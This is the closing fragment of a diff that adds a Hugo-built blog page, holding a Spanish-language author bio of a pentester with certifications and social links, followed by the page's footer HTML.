+¡Hola! Soy Ghxstsec, un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.
+
+Actualmente, poseo las certificaciones eJPTv2, eCPPTv3 y Google Cybersecurity Professional Certificate. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.
+
+✉️ Conéctate conmigo:
+
+LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
+GitHub: [GitHub](https://github.com/Ghxstsec)
+Twitter/X: [Twitter](https://x.com/Louikizz)
+Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)
+
+¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
+</code></pre>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
